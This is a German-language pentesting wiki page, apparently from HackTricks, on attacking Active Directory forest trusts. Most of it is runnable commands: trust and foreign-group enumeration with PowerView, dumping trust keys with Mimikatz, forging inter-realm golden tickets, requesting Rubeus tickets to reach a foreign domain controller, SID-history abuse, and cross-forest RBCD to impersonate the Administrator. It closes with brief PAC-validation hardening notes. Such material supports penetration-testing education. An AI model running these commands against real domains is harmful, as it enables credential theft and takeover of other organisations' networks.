# Externe Forest-Domain - OneWay (Inbound) oder bidirektional

{{#include ../../banners/hacktricks-training.md}}

In diesem Szenario vertraut eine externe Domäne Ihnen (oder beide vertrauen einander), sodass Sie irgendeine Art von Zugriff darauf erlangen können.

## Enumeration

Zunächst müssen Sie die **Vertrauensstellung** **enumerate**:
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*` lassen dich schnell erkennen, ob cross-forest Missbrauchspfade (RBCD, SIDHistory) wahrscheinlich ohne zusätzliche Voraussetzungen funktionieren.

In der vorherigen Enumeration wurde festgestellt, dass der Benutzer **`crossuser`** Mitglied der Gruppe **`External Admins`** ist, die **Admin access** im **DC der externen Domain** besitzt.

## Initial Access

Wenn du keinen **speziellen** Zugriff deines Benutzers in der anderen Domain finden konntest, kannst du trotzdem zur AD Methodology zurückkehren und versuchen, **privesc from an unprivileged user** (Dinge wie kerberoasting zum Beispiel):

Du kannst **Powerview functions** verwenden, um die **andere Domain** mit dem `-Domain` param zu **enumerate**, zum Beispiel:
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Impersonation

### Anmeldung

Mit einer normalen Methode und den Zugangsdaten eines Benutzers, der Zugriff auf die externe Domain hat, sollten Sie darauf zugreifen können:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID History Missbrauch

Du kannst [**SID History**](sid-history-injection.md) auch über einen Forest-Trust ausnutzen.

Wenn ein Benutzer **von einem Forest in einen anderen** migriert wird und **SID Filtering is not enabled**, ist es möglich, **eine SID aus dem anderen Forest hinzuzufügen**, und diese **SID** wird dem **Token des Benutzers** hinzugefügt, wenn er sich **über den Trust** authentifiziert.

> [!WARNING]
> Zur Erinnerung: Du kannst den Signing Key mit
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

Du könntest mit dem **trusted** key ein **TGT impersonating** des Benutzers der aktuellen Domäne signieren.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Vollständiger Ablauf zur Benutzerimpersonation
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Cross-forest RBCD, wenn Sie ein Computer-Konto im trusting forest kontrollieren (no SID filtering / selective auth)

Wenn Ihr foreign principal (FSP) Sie in eine Gruppe bringt, die Computerobjekte im trusting forest schreiben kann (z. B. `Account Operators` oder eine benutzerdefinierte Provisioning-Gruppe), können Sie **Resource-Based Constrained Delegation** auf einem Zielhost dieses Forests konfigurieren und dort jeden Benutzer impersonate:
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
Dies funktioniert nur, wenn **SelectiveAuthentication is disabled** und **SID filtering** Ihre kontrollierende SID nicht entfernt. Es ist ein schneller lateraler Pfad, der SIDHistory forging umgeht und bei Trust-Überprüfungen häufig übersehen wird.

### Härtung der PAC-Validierung

Aktualisierungen der PAC-Signaturvalidierung für **CVE-2024-26248**/**CVE-2024-29056** führen eine Signaturdurchsetzung für forest-übergreifende Tickets ein. In **Compatibility mode** können gefälschte inter-realm PAC/SIDHistory/S4U-Pfade auf ungepatchten DCs weiterhin funktionieren. In **Enforcement mode** werden nicht signierte oder manipulierte PAC-Daten, die einen forest trust überschreiten, abgewiesen, es sei denn, Sie besitzen außerdem den Ziel-Forest-Trust-Schlüssel. Registry overrides (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) können dies abschwächen, solange sie verfügbar sind.



## Referenzen

- [Microsoft KB5037754 – PAC validation changes for CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [MS-PAC spec – SID filtering & claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
